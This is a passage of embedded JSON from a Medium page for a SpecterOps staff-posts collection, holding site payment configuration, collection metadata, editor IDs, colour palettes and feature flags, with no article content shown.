here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ImageMetadata:1*D-FDlfkqivRBQZoESrwtqw.png":{"__typename":"ImageMetadata","id":"1*D-FDlfkqivRBQZoESrwtqw.png"},"Collection:f05f8696e3cc":{"__typename":"Collection","id":"f05f8696e3cc","favicon":{"__ref":"ImageMetadata:1*D-FDlfkqivRBQZoESrwtqw.png"},"domain":"posts.specterops.io","slug":"specter-ops-posts","googleAnalyticsId":"UA-102239211-2","editors":[{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:74ad66811b78"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:70f84c574024"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:f4ab382d41"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:1bb43103a9a9"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:b9c2df322eaf"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:b206c297df42"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:d59f95c1ed1c"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:6e849bed7683"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:9bef3c9a8b49"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:10eca8f7a844"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:d248a36145f8"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:2562fc45d9a9"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:645ffcef8682"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:a041d7ac11fe"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:507d73de7b97"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:e7dfc7678b59"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:ff850017e32a"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:4d7214ceeaf8"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:760e415ea3c9"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:f95d89c4ba81"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:59a56792287a"}}],"name":"Posts By SpecterOps Team Members","avatar":{"__ref":"ImageMetadata:1*D-FDlfkqivRBQZoESrwtqw.png"},"description":"Posts from SpecterOps team members on various topics relating information security","subscriberCount":4765,"customStyleSheet":null,"latestPostsConnection({\"paging\":{\"limit\":1}})":{"__typename":"PostConnection","posts":[{"__ref":"Post:24163abc8de3"}]},"viewerEdge":{"__ref":"CollectionViewerEdge:collectionId:f05f8696e3cc-viewerId:lo_7f2bf6c42a29"},"twitterUsername":"specterops","facebookPageId":null,"logo":{"__ref":"ImageMetadata:1*s-5BWBr8XsgtIU5azKNhZQ.jpeg"},"colorPalette":{"__typename":"ColorPalette","highlightSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FFFFFFFF","colorPoints":[{"__typename":"ColorPoint","color":"#FFF3F1FF","point":0},{"__typename":"ColorPoint","color":"#FFF1EFFF","point":0.1},{"__typename":"ColorPoint","color":"#FFEEEDFF","point":0.2},{"__typename":"ColorPoint","color":"#FFECEBFF","point":0.3},{"__typename":"ColorPoint","color":"#FFEAE9FF","point":0.4},{"__typename":"ColorPoint","color":"#FFE8E7FF","point":0.5},{"__typename":"ColorPoint","color":"#FFE5E4FF","point":0.6},{"__typename":"ColorPoint","color":"#FFE3E2FF","point":0.7},{"__typename":"ColorPoint","color":"#FFE1E0FF","point":0.8},{"__typename":"ColorPoint","color":"#FFDEDEFF","point":0.9},{"__typename":"ColorPoint","color":"#FFDCDCFF","point":1}]},"defaultBackgroundSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FFFFFFFF","colorPoints":[{"__typename":"ColorPoint","color":"#FF8080B7","point":0},{"__typename":"ColorPoint","color":"#FF7777A8","point":0.1},{"__typename":"ColorPoint","color":"#FF6E6E9A","point":0.2},{"__typename":"ColorPoint","color":"#FF65658B","point":0.3},{"__typename":"ColorPoint","color":"#FF5C5B7D","point":0.4},{"__typename":"ColorPoint","color":"#FF52526E","point":0.5},{"__typename":"ColorPoint","color":"#FF484860","point":0.6},{"__typename":"ColorPoint","color":"#FF3D3D51","point":0.7},{"__typename":"ColorPoint","color":"#FF323241","point":0.8},{"__typename":"ColorPoint","color":"#FF262632","point":0.9},{"__typename":"ColorPoint","color":"#FF191921","point":1}]},"tintBackgroundSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FF1E184B","colorPoints":[{"__typename":"ColorPoint","color":"#FF1E184B","point":0},{"__typename":"ColorPoint","color":"#FF3A3866","point":0.1},{"__typename":"ColorPoint","color":"#FF54537D","point":0.2},{"__typename":"ColorPoint","color":"#FF6C6C93","point":0.3},{"__typename":"ColorPoint","color":"#FF8383A6","point":0.4},{"__typename":"ColorPoint","color":"#FF9999B9","point":0.5},{"__typename":"ColorPoint","color":"#FFAEAECA","point":0.6},{"__typename":"ColorPoint","color":"#FFC3C2DB","point":0.7},{"__typename":"ColorPoint","color":"#FFD8D6EB","point":0.8},{"__typename":"ColorPoint","color":"#FFEBEAFA","point":0.9},{"__typename":"ColorPoint","color":"#FFFFFDFF","point":1}]}}},"ROOT_QUERY":{"__typename":"Query","collectionByDomainOrSlug({\"domainOrSlug\":\"posts.specterops.io\"})":{"__ref":"Collection:f05f8696e3cc"},"viewer":null,"postResult({\"id\":\"9ed71d38d546\"})":{"__ref":"Post:9ed71d38d546"},"variantFlags":[{"__typename":"VariantFlag","name":"enable_android_dynamic_programming_paywall","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_bg_post_post","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_iceland_forced_android","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_enable_friend_links_postpage_banners","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lo_homepage","valueType":{"__typename":"VariantFlagString","value":"control"}},{"__typename":"VariantFlag","name":"enable_moc_load_processor_all_recs_surfaces","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_android_miro_v2","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"mobile_custom_app_icon","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_android_offline_reading","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_intrinsic_automatic_actions","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_recaptcha_enterprise","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"reader_fair_distribution_non_qp","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_rating_prompt_stories_read_threshold","valueType":{"__typename":"VariantFlagNumber","value":2}},{"__typename":"VariantFlag","name":"enable_apple_webhook","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_verifications_service","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_syntax_highlight","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_integration","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_enable_lock_responses","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"allow_signup","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_google_one_tap","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_members_only_audio","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"redefined_top_posts","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_image_sharer","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_boost_nia_v01","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_branch_io","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_creator_welcome_email","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_android_verified_author","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_premium_tier_badge","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_recommended_publishers_query","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_iceland_nux","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_mastodon_for_members","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"available_monthly_premium_plan","valueType":{"__typename":"VariantFlagString","value":"12a660186432"}},{"__typename":"VariantFlag","name":"enable_ios_offline_reading","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_pp_v4","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_rex_new_push_notification_endpoint","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tipping_v0_ios","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_friend_links_postpage_banners","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_abandoned_cart_promotion_email","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_explicit_signals","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_import","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_rito_upstream_deadlines","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_switch_plan_premium_tier","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"disable_partner_program_enrollment","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_configure_pronouns","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_mastodon_avatar_upload","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_pill_based_home_feed","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tipping_v0_android","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"available_annual_plan","valueType":{"__typename":"VariantFlagString","value":"2c754bcc2995"}},{"__typename":"VariantFlag","name":"available_annual_premium_plan","valueType":{"__typename":"VariantFlagString","value":"4a442ace1476"}},{"__typename":"VariantFlag","name":"enable_conversion_model_v2","valueType":{"__typename":"VariantFlagString","value":"group_2"}},{"__typename":"VariantFlag","name":"enable_speechify_ios","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_lists_v2","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_in_app_free_trial","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ios_easy_resubscribe","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_server_upstream_deadlines","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"textshots_userid","valueType":{"__typename":"VariantFlagString","value":""}},{"__typename":"VariantFlag","name":"enable_billing_frequency_on_step2","valueType":{"__typename":"VariantFlagString","value":"control"}},{"__typename":"VariantFlag","name":"enable_footer_app_buttons","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tag_recs","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tribute_landing_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_see_pronouns","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_tick_landing_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ios_dynamic_paywall_aspiriational","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_topic_portals","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_apple_sign_in","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_group_gifting","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"allow_access","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"reengagement_notification_duration","valueType":{"__typename":"VariantFlagNumber","value":3}},{"__typename":"VariantFlag","name":"skip_fs_cache_user_vals","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_sprig","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_newsletter_lo_flow_custom_domains","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_bottom_responses_input","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_susi_redesign_ios","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_editor_new_publishing_flow","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_publication_hierarchy_web","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_starspace","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_automod","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_new_stripe_customers","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_simplified_digest_v2_b","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_update_explore_wtf","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_remove_twitter_onboarding_step","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_update_topic_portals_wtf","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"limit_post_referrers","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_aurora_pub_follower_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_continue_this_thread","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_homepage","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_medium2_kbfd","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_bayesian_average_pub_search","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_rex_aggregator_v2","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_display_paywall_after_onboarding","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_app_flirty_thirty","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"can_receive_tips_v0","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_auto_follow_on_subscribe","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_conversion_ranker_v2","valueType":{"__typename":"VariantFlagString","value":"control"}},{"__typename":"VariantFlag","name":"goliath_externalsearch_enable_comment_deindexation","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"allow_test_auth","valueType":{"__typename":"VariantFlagString","value":"disallow"}},{"__typename":"VariantFlag","name":"enable_ml_rank_rex_anno","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_pp_country_expansion","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_social_share_sheet","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_updated_pub_recs_ui","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_google_pay","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"signin_services","valueType":{"__typename":"VariantFlagString","value":"twitter,facebook,google,email,google-fastidv,google-one-tap,apple"}},{"__typename":"VariantFlag","name":"enable_recirc_model","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_post_bottom_responses","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_entities_to_follow_v2","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_diversification_rex","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_susi_redesign_android","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"onboarding_tags_from_top_views","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_eventstats_event_processing","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_explicit_signals_updated_post_previews","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_enable_verified_book_author","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_deprecate_legacy_providers_v3","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_trial_membership","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ios_dynamic_paywall_programming","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"coronavirus_topic_recirc","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_mastodon_for_members_username_selection","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_ranker_v10","valueType":{"__typename":"VariantFlagString","value":"control"}},{"__typename":"VariantFlag","name":"glyph_font_set","valueType":{"__typename":"VariantFlagString","value":"m2-unbound-source-serif-pro"}},{"__typename":"VariantFlag","name":"enable_lite_response_markup","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_two_hour_refresh","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_marketing_emails","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_seamless_social_sharing","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_author_cards_byline","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_client","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_paypal","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_cache_less_following_feed","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_sharer_validate_post_share_key","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"price_smoke_test_monthly","valueType":{"__typename":"VariantFlagString","value":""}},{"__typename":"VariantFlag","name":"enable_author_cards","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_lite_archive_page","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_maim_the_meter","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_android_dynamic_aspirational_paywall","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_apple_pay","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_new_manage_membership_flow","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_sharer_create_post_share_key","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_speechify_widget","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_enable_friend_links_creation","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_pre_pp_v4","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"ios_enable_home_post_menu","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_legacy_feed_in_iceland","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_rex_reading_history","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_braintree_webhook","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_premium_tier","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"browsable_stream_config_bucket","valueType":{"__typename":"VariantFlagString","value":"curated-topics"}},{"__typename":"VariantFlag","name":"enable_ios_autorefresh","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"num_post_bottom_responses_to_show","valueType":{"__typename":"VariantFlagString","value":"1"}},{"__typename":"VariantFlag","name":"available_monthly_plan","valueType":{"__typename":"VariantFlagString","value":"60e220181034"}},{"__typename":"VariantFlag","name":"limit_user_follows","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"android_enable_friend_links_creation","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"rex_generator_max_candidates","valueType":{"__typename":"VariantFlagNumber","value":1000}},{"__typename":"VariantFlag","name":"enable_moc_load_processor_c","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_moc_load_processor_first_story","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"price_smoke_test_yearly","valueType":{"__typename":"VariantFlagString","value":""}},{"__typename":"VariantFlag","name":"signup_services","valueType":{"__typename":"VariantFlagString","value":"twitter,facebook,google,email,google-fastidv,google-one-tap,apple"}},{"__typename":"VariantFlag","name":"can_send_tips_v0","valueType":{"__typename":"VariantFlagBoolean","value":true}},{"__typename":"VariantFlag","name":"enable_google_webhook","valueType":{"__typename":"VariantFlagBoolean","value":true}}]},"User:74ad66811b78":{"__typename":"User","id":"74ad66811b78"},"User:70f84c574024":{"__typename":"User","id":"70f84c574024"},"User:f4ab382d41":{"__typename":"User","id":"f4ab382d41"},"User:1bb43103a9a9":{"__typename":"User","id":"1bb43103a9a9"},"User:b9c2df322eaf":{"__typename":"User","id":"b9c2df322eaf","customDomainState":null,"hasSubdomain":false,"username":"_wald0"},"User:b206c297df42":{"__typename":"User","id":"b206c297df42"},"User:d59f95c1ed1c":{"__typename":"User","id":"d59f95c1ed1c"},"User:6e849bed7683":{"__typename":"User","id":"6e849bed7683"},"User:9bef3c9a8b49":{"__typename":"User","id":"9bef3c9a8b49"},"User:10eca8f7a844":{"__typename":"User","id":"10eca8f7a844"},"User:d248a36145f8":{"__typename":"User","id":"d248a36145f8"},"User:2562fc45d9a9":{"__typename":"User","id":"2562fc45d9a9"},"User:645ffcef8682":{"__typename":"User","id":"645ffcef8682"},"User:a041d7ac11fe":{"__typename":"User","id":"a041d7ac11fe"},"User:507d73de7b97":{"__typename":"User","id":"507d73de7b97"},"User:e7dfc7678b59":{"__typename":"User","id":"e7dfc7678b59"},"User:ff850017e32a":{"__typename":"User","id":"ff850017e32a"},"User:4d7214ceeaf8":{"__typename":"User","id":"4d7214ceeaf8"},"User:760e415ea3c9":{"__typename":"User","id":"760e415ea3c9"},"User:f95d89c4ba81":{"__typename":"User","id":"f95d89c4ba81"},"User:59a56792287a":{"__typename":"User","id":"59a56792287a"},"Post:24163abc8de3":{"__typename":"Post","id":"24163abc8de3","firstPublishedAt":1732124611972,"creator":{"__ref":"User:b9c2df322eaf"},"collection":{"__ref":"Collection:f05f8696e3cc"},"isSeries":false,"mediumUrl